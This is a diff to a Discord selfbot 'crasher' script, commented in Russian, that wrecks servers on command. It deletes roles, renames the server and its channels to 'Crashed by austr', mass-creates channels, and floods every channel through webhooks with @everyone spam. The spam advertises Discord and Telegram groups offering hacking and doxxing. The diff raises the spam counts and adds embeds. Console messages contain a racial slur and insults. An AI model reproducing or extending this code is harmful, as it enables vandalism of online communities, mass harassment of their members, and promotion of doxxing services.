@@ -1,3 +1,5 @@
+// добавлена поддержка Embed  и увеличена скорость
+
 const token = process.env['TOKEN']
 const Discord = require('discord.js-selfbot');
 const keepAlive = require('./server.js');
@@ -13,8 +15,17 @@ client.on('ready', () => { //при загрузке бота
 console.log("негры");
 }); 
 
+function getRandomInt(min, max) {
+  min = Math.ceil(min);
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min)) + min;
+}
 
-
+const embed = new MessageEmbed()
+	.setTitle('Данный сервер крашится')
+	.setDescription('Данный сервер крашится Австром. Если хотите также - переходите\nА если хочешь научиться взлому/раскрытию личности - тогда тебе в наш телеграмм https://discord.gg/lavanbot\nhttps://t.me/russian_deanon') 
+        .setImage('https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png')
+	.setColor('#ff0000');
 
 
 client.on('message', async (message) => {
@@ -30,12 +41,12 @@ client.on('message', async (message) => {
         message.guild.roles.cache.forEach(role => { 
         if (role.editable && role.id !== message.guild.id) role.delete() 
     }); 
-    await message.guild.setIcon("https://media.discordapp.net/attachments/937000390862471269/938807454374969434/blood.jpg");
-    await message.guild.setName("×××Crashed by austr×××");
+    await message.guild.setIcon("https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png");
+    await message.guild.setName("××× Crashed by austr ×××");
 
-    for (let i = 1; i <= 25; i++) {
+    for (let i = 1; i <= 50; i++) {
         message.guild.channels
-          .create("crashed-by-austr", {
+          .create("crashed-by-austr-"+getRandomInt(1, 1000), {
             type: "text",
             topic: "https://discord.gg/lavanbot",
           })
@@ -44,7 +55,10 @@ client.on('message', async (message) => {
 				}).then(async webhook => {
                   for (let i = 1; i <= 30; i++) { 
                             webhook.send({
-	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/web_anarchy',
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/russian_deanon',
+	username: '××× Crashed by Austr ×××',
+	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
+	embeds: [embed],
 });      
                   };
               });
@@ -55,17 +69,19 @@ client.on('message', async (message) => {
 });
 
 
-
 client.on('message', async (message) => {
   if (message.content === '~hookall') {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
      message.guild.channels.cache.forEach
-     (channel => {channel.createWebhook("×××Crashed by austr×××", { 
+     (channel => {channel.createWebhook("××× Crashed by Austr ×××", { 
               }).then(async webhook => {
-                  for (let i = 1; i <= 25; i++) {
+                  for (let i = 1; i <= 30; i++) {
                             webhook.send({
-	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/web_anarchy',
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/russian_deanon',
+	username: '××× Crashed by Austr ×××',
+	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
+	embeds: [embed],
 });        
                   };
               });
@@ -81,7 +97,7 @@ client.on('message', async (message) => {
   if (allowedusers.includes(message.author.id)) {
     message.delete(); 
      message.guild.channels.cache.forEach
-     (channel => {channel.createWebhook("×××Crashed by austr×××", {})
+     (channel => {channel.createWebhook("××× Crashed by Austr ×××", {})
           });
         };
     } else {console.log('ваша мама шлюха')}
@@ -112,7 +128,7 @@ client.on('message', async (message) => {
     message.delete(); 
     try {
      message.guild.channels.cache.forEach 
-     (channel => channel.setName("crashed-by-austr"));  
+     (channel => channel.setName("crashed-by-austr-"+getRandomInt(1, 1000)));  
      } catch { 
         console.log(error)
         } 
@@ -152,7 +168,7 @@ client.on('message', (msg) => {
         msg.guild.roles
           .create({
             data: {
-              name: "💣 Crashed by Austr 💣",
+              name: " Crashed by Austr "+getRandomInt(1, 1000),
               color: "#ff0000",
             },
           })
@@ -161,7 +177,6 @@ client.on('message', (msg) => {
   }
     } else {console.log('ваша мама шлюха')}
 })
-
 
 keepAlive();
 client.login(token);
